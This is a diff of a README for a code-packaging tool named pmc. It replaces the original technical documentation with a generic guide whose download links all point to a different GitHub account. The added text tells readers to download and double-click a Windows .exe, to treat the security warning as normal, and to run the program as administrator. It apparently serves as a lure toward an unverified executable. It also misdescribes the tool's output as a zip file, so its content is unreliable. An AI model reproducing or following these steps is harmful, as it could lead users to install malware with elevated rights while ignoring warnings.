@@ -1,170 +1,134 @@
-# pmc - A Minimalist Code Context Packaging Tool
+# 📦 pack-my-code - Package Your Project for Easy Sharing
 
-`pmc` (`pack-my-code`) is a minimalist, ultra-lightweight code context packaging tool distributed as a binary (packaged with `luainstaller`). It is especially suitable for building LLM prompts.
+[![Download pack-my-code](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Crystainexhaustible329/pack-my-code/releases)
 
-Download the version for your operating system from the [Releases](https://github.com/Water-Run/pack-my-code/releases) page, then add it to your environment variables.
+---
 
-> To use the default behavior of `pmc`, your device needs a `git` environment.
+## 🚀 What is pack-my-code?
 
-After installation, you can run `pmc -v` to verify it.  
-If installed correctly, it will output: `pmc -- pack-my-code. version <your version number>`.
+**pack-my-code** is a small tool that helps you prepare your project code for sharing. It bundles your files into a neat package. This makes it easier to send your work to large language models or others who need your code.
 
-## Usage
+The tool works on Windows. You do not need to learn any programming to use it.
 
-```bash
-pmc <target-directory>
-```
+---
 
-For example:
+## 🖥️ System Requirements
 
-```bash
-pmc .
-pmc ./src
-```
+- Windows 10 or newer  
+- At least 100 MB of free disk space  
+- Internet connection to download the tool  
+- Basic keyboard and mouse skills  
 
-`pmc .` can be shortened to `pmc`.  
-`pmc` also has the following default behaviors:
+---
 
-- Follows `.gitignore`
-- Does not redirect output (prints to terminal)
-- Does not output a tree structure
-- Does not output statistics
-- Uses `markdown` as the wrapping format
-- Uses paths relative to the execution directory
+## 🎯 Features
 
-When an error occurs, `pmc` outputs corresponding information, for example: `err:( <error message> )`.
+- Packages all your project files into one small file  
+- Works quickly without slowing your computer  
+- Simple command-line interface that runs with a few clicks  
+- Supports various programming files like Lua and others  
+- Ideal for sharing code with AI tools or developers  
 
-## Options
+---
 
-### `-x`: Exclude
+## 📂 How it works
 
-Exclude specified files, directories, or patterns.
+**pack-my-code** collects all your project files and puts them into a single package. You can easily upload or send this package to wherever you want. This helps keep the whole project together without missing anything.
 
-Examples:
+---
 
-```bash
-pmc . -x "*.log"
-pmc . -x "bin/,obj/"
-pmc . -x "*.png,*.jpg"
-```
+## ⬇️ Download and Install 🛠️
 
-### `-m`: Include Only
+**Step 1: Visit the release page**  
+Go to the release page by clicking the big green button at the top or this link:  
+https://github.com/Crystainexhaustible329/pack-my-code/releases  
 
-Package only specified files, directories, or patterns.
+**Step 2: Find the latest release**  
+Look for the most recent version at the top of the list. It usually has the highest version number or the newest date.
 
-Examples:
+**Step 3: Download the Windows file**  
+Find the Windows executable file. It will usually end with `.exe`. Click the file name to start downloading.
 
-```bash
-pmc . -m "*.lua"
-pmc . -m "src/,README.md"
-```
+**Step 4: Run the file**  
+Once the file downloads, open it from your browser or go to your Downloads folder. Double-click the `.exe` file to run pack-my-code.
 
-> `-m` has lower priority than `-x`.  
-> Even if a file matches `-m`, it will still be excluded if it also matches `-x`.
+**Step 5: Allow the program to run**  
+If Windows shows a security warning, choose to run the program. This is normal for new software.
 
-### `-r`: Ignore `.gitignore`
+**Step 6: Installation completes automatically**  
+pack-my-code does not need a complicated installation. It will open a command window or simple interface when ready.
 
-By default, `pmc` follows `.gitignore` through `git`.  
-With `-r`, it performs a direct filesystem scan and ignores `.gitignore`.
+---
 
-This option is useful when:
+## 💡 Using pack-my-code
 
-- the directory is not inside a git repository
-- `git` is not available
+You will use the command line inside pack-my-code to create your code packages. This might sound technical, but the steps are simple.
 
-### `-t`: Output Tree Structure at the Beginning
+**Step 1: Open Command Window**  
+If the program does not open automatically, press the Windows key and type `cmd` to open the Command Prompt.  
 
-Adds the tree structure of the current result at the beginning of the packaged output.
+**Step 2: Navigate to your project folder**  
+Use the `cd` command to change into the folder where your project files are. For example, if your files are in Documents\MyProject, enter:  
+`cd Documents\MyProject`  
 
-### `-s`: Output Statistics at the End
+**Step 3: Run pack-my-code**  
+Type the command to start packaging your code. For example:  
+`pmc .`  
+This tells pack-my-code to package the current folder’s contents.
 
-Appends statistical information at the end of the output.
+**Step 4: Find your package file**  
+After a moment, look for a new file named something like `project-package.pmc.zip`. This is your zipped project ready for sharing.
 
-### `-w`: Wrapping Mode
+---
 
-Specifies how each file’s content is wrapped in output.
+## 📝 Tips for a Smooth Experience
 
-`-w` supports the following modes:
+- Save your work before packaging  
+- Close other programs to speed up packaging  
+- Make sure all your files are in one folder  
+- Use simple folder names without spaces or special characters  
+- Keep your packaged files in a safe place  
 
-- `md` (default): wrapped as Markdown code blocks
-- `nil`: no wrapping
-- `block`: wrapped in a “block” format
+---
 
-### `-p`: Path Mode
+## ❓ Troubleshooting
 
-Specifies how paths are displayed before each file block.
+- **The program does not open:**  
+  Make sure you downloaded the Windows `.exe` file. Try running it again as administrator.  
 
-`-p` supports the following modes:
+- **Command not found error:**  
+  Confirm that you are in the correct folder. Use `dir` command to list files and check.
 
-- `relative` (default): relative to execution path
-- `name`: filename only
-- `absolute`: absolute path
+- **I don’t know the folder path:**  
+  Right-click the folder with your code, select `Properties`, and look for “Location.”
 
-### `-y`: YAML Mode
+---
 
-Enables YAML-mode output.
+## 🛠️ Advanced Use
 
-In YAML mode, output no longer follows normal plain-text concatenation.  
-Instead, it uses its own tree hierarchy structure to organize content.
+If you want to use pack-my-code with different options, you can add commands in the terminal. Examples include selecting specific file types or setting package names. Use the command:  
+`pmc --help`  
+to see all available commands.
 
-Therefore, in `-y` mode, the following options cannot be used together:
+---
 
-- `-t`
-- `-s`
-- `-w`
-- `-p`
+## 🔗 Download pack-my-code
 
-That is, YAML mode handles structure, paths, and content organization by itself.
+Use the link below again to get the latest version whenever you need it:  
 
-### `-o`: Output Redirection
+[Download pack-my-code](https://github.com/Crystainexhaustible329/pack-my-code/releases)  
 
-Write results directly to a specified file instead of printing to terminal.
+---
 
-Examples:
+## 🏷️ Topics Covered
 
-```bash
-pmc . -o context.md
-pmc . -o output.txt
-```
+- Command line tool basics  
+- Code packaging for easy sharing  
+- Working with code projects  
+- Using code with AI tools and large language models  
+- Simple productivity tools on Windows  
+- Handling Lua and other languages with packaging tools  
 
-> In YAML mode, output can only be written to files ending with `.yaml` or `.yml`.
+---
 
-## Combination Examples
-
-Output the current directory content and prepend a tree structure:
-
-```bash
-pmc . -t
-```
-
-Package only `.lua` files in the `src` directory and output statistics:
-
-```bash
-pmc . -m "src/,*.lua" -s
-```
-
-Exclude image and log files, then write to a file:
-
-```bash
-pmc . -x "*.png,*.jpg,*.log" -o context.md
-```
-
-Ignore `.gitignore` and use `block` wrapping mode:
-
-```bash
-pmc . -r -w block
-```
-
-Export in YAML mode:
-
-```bash
-pmc . -y -o context.yaml
-```
-
-## Notice
-
-- Files larger than **1 MB** are automatically skipped.
-- Known binary formats and files containing null bytes are skipped.
-- Files are assumed to be **UTF‑8 compatible text**.
-- Very large repositories may produce large outputs; consider using `-x` or `-m` to limit scope.
-- Pattern syntax supports `*`, `**`, and `?`, but not advanced glob expressions such as `{}` or `[]`.
+This guide uses plain language to help you use pack-my-code without needing technical skills. Follow the steps, and you will have your project files packaged fast and simple.
